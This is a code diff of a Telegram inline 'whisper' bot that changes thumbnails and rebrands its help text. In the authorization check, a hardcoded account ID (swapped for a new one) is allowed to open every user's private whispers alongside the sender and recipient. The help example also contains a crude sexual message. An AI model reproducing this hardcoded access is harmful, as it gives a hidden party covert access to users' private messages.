@@ -20,7 +20,7 @@ async def _whisper(_, inline_query):
                 title="💒 Whisper",
                 description=f"@{BOT_USERNAME} [ USERNAME | ID ] [ TEXT ]",
                 input_message_content=InputTextMessageContent(f"💒 Usage:\n\n@{BOT_USERNAME} [ USERNAME | ID ] [ TEXT ]"),
-                thumb_url="https://graph.org/file/4a6162a36589d3d12c226.jpg",
+                thumb_url="https://graph.org/file/2ce1561ccac8b80b65691.jpg",
                 reply_markup=switch_btn
             )
         ]
@@ -39,7 +39,7 @@ async def _whisper(_, inline_query):
                     title="💒 Whisper",
                     description="Invalid username or ID!",
                     input_message_content=InputTextMessageContent("Invalid username or ID!"),
-                    thumb_url="https://graph.org/file/4a6162a36589d3d12c226.jpg",
+                    thumb_url="https://graph.org/file/2ce1561ccac8b80b65691.jpg",
                     reply_markup=switch_btn
                 )
             ]
@@ -52,14 +52,14 @@ async def _whisper(_, inline_query):
                     title="💒 Whisper",
                     description=f"Send a Whisper to {user.first_name}!",
                     input_message_content=InputTextMessageContent(f"💒 You are sending a whisper to {user.first_name}.\n\nType your message/sentence."),
-                    thumb_url="https://graph.org/file/4a6162a36589d3d12c226.jpg",
+                    thumb_url="https://graph.org/file/2ce1561ccac8b80b65691.jpg",
                     reply_markup=whisper_btn
                 ),
                 InlineQueryResultArticle(
                     title="🔩 One-Time Whisper",
                     description=f"Send a one-time whisper to {user.first_name}!",
                     input_message_content=InputTextMessageContent(f"🔩 You are sending a one-time whisper to {user.first_name}.\n\nType your message/sentence."),
-                    thumb_url="https://graph.org/file/4a6162a36589d3d12c226.jpg",
+                    thumb_url="https://graph.org/file/2ce1561ccac8b80b65691.jpg",
                     reply_markup=one_time_whisper_btn
                 )
             ]
@@ -82,7 +82,7 @@ async def whispes_cb(_, query):
     to_user = int(data[2])
     user_id = query.from_user.id
     
-    if user_id not in [from_user, to_user, 6632587591]:
+    if user_id not in [from_user, to_user, 6691393517]:
         try:
             await _.send_message(from_user, f"{query.from_user.mention} is trying to open your whisper.")
         except Unauthorized:
@@ -103,16 +103,16 @@ async def whispes_cb(_, query):
     
     if len(data) > 3 and data[3] == "one":
         if user_id == to_user:
-            await query.edit_message_text("📬 mera kam hogaya jana!\n\nPress the button below to send a whisper!", reply_markup=SWITCH)
+            await query.edit_message_text("📬 Whisper has been read!\n\nPress the button below to send a whisper!", reply_markup=SWITCH)
 
 
 async def in_help():
     answers = [
         InlineQueryResultArticle(
             title="💒 Whisper",
-            description=f"@naveen92316 [USERNAME | ID] [TEXT]",
+            description=f"@YumikooBot [USERNAME | ID] [TEXT]",
             input_message_content=InputTextMessageContent(f"**📍Usage:**\n\n@YumikooBot (Target Username or ID) (Your Message).\n\n**Example:**\n@YumikooBot @username I Wanna Phuck You"),
-            thumb_url="https://graph.org/file/4a6162a36589d3d12c226.jpg",
+            thumb_url="https://graph.org/file/2ce1561ccac8b80b65691.jpg",
             reply_markup=switch_btn
         )
     ]
